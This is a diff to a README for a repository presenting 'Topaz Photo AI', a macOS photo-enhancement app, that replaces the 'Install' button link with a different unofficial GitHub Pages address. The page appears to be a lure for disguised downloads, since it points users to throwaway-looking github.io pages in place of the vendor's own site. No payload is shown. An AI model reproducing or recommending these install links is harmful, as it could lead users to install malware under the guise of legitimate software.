@@ -2,7 +2,7 @@
 <h1 align="center">Topaz Photo AI</h1>
 <p align="center">Native AI photo enhancement — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://napas-papuas.github.io/.github/topazphoto"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://divan-shkaf.github.io/.github/topazphoto"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://shotkit.com/wp-content/uploads/bb-plugin/cache/topazphotoai-landscape-2fac4bbc383b7c3f3f8fea2eb38f73fe-zybravgx2q47.jpg" alt="Topaz Photo AI — macOS AI photo enhancement screenshot" width="780"/></p>
 
 ---
